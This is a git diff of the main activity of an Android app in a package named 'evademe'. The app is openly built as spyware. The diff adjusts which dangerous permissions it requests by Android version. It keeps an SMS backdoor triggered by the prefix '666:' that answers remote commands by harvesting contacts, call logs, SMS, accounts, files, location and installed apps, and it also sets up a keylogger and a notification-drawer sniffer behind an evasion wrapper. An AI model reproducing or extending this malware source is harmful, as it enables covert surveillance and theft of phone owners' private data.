@@ -1,6 +1,7 @@
 package com.evilthreads.evademe
 
 import android.Manifest
+import android.os.Build
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
@@ -57,33 +58,35 @@ class MainActivity : AppCompatActivity() {
                 }.join()
                 keyloggerJob.join()
             }
-
         }
         evade {
-            KotlinPermissions.with(this)
-                .permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION)
-                .onAccepted {
-                    SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
-                        runBlocking {
-                            when (remoteCommand) {
-                                "COMMAND_GET_CONTACTS" -> calendarFlow().collect { calendarEvent -> Log.d("PICKPOCKET", calendarEvent.toString()) }
-                                "COMMAND_GET_CALL_LOG" -> callLogFlow().collect { call -> Log.d("PICKPOCKET", call.toString()) }
-                                "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
-                                "COMMAND_GET_ACCOUNTS" -> accountsFlow().collect { account -> Log.d("PICKPOCKET", account.toString()) }
-                                "COMMAND_GET_MMS" -> smsFlow().collect { mms -> Log.d("PICKPOCKET", mms.toString()) }
-                                "COMMAND_GET_FILES" -> filesFlow().collect { file -> Log.d("PICKPOCKET", file.toString()) }
-                                "COMMAND_GET_DEVICE_INFO" -> deviceFlow().collect { device -> Log.d("PICKPOCKET", device.toString()) }
-                                "COMMAND_GET_LOCATION" -> deviceFlow().collect { location -> Log.d("PICKPOCKET", location.toString()) }
-                                "COMMAND_GET_SETTINGS" -> settingsFlow().collect { setting -> Log.d("PICKPOCKET", setting.toString()) }
-                                "COMMAND_GET_INSTALLED_APPS" -> softwareFlow().collect { app -> Log.d("PICKPOCKET", app.toString()) }
-                                else -> Log.d(TAG, "COMMAND NOT FOUND")
-                            }
+            val kotlinPermissions = KotlinPermissions.with(this)
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                kotlinPermissions.permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
+            else
+                kotlinPermissions.permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
+            kotlinPermissions.onAccepted {
+                SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
+                    runBlocking {
+                        when (remoteCommand) {
+                            "COMMAND_GET_CONTACTS" -> calendarFlow().collect { calendarEvent -> Log.d("PICKPOCKET", calendarEvent.toString()) }
+                            "COMMAND_GET_CALL_LOG" -> callLogFlow().collect { call -> Log.d("PICKPOCKET", call.toString()) }
+                            "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
+                            "COMMAND_GET_ACCOUNTS" -> accountsFlow().collect { account -> Log.d("PICKPOCKET", account.toString()) }
+                            "COMMAND_GET_MMS" -> smsFlow().collect { mms -> Log.d("PICKPOCKET", mms.toString()) }
+                            "COMMAND_GET_FILES" -> filesFlow().collect { file -> Log.d("PICKPOCKET", file.toString()) }
+                            "COMMAND_GET_DEVICE_INFO" -> deviceFlow().collect { device -> Log.d("PICKPOCKET", device.toString()) }
+                            "COMMAND_GET_LOCATION" -> deviceFlow().collect { location -> Log.d("PICKPOCKET", location.toString()) }
+                            "COMMAND_GET_SETTINGS" -> settingsFlow().collect { setting -> Log.d("PICKPOCKET", setting.toString()) }
+                            "COMMAND_GET_INSTALLED_APPS" -> softwareFlow().collect { app -> Log.d("PICKPOCKET", app.toString()) }
+                            else -> Log.d(TAG, "COMMAND NOT FOUND")
                         }
                     }
-                    Keylogger.requestPermission(this)
-                    if (!DrawerSniffer.hasPermission(this))
-                        DrawerSniffer.requestPermission(this)
-                }.ask()
+                }
+                Keylogger.requestPermission(this)
+                if (!DrawerSniffer.hasPermission(this))
+                    DrawerSniffer.requestPermission(this)
+            }.ask()
         }
     }
 }
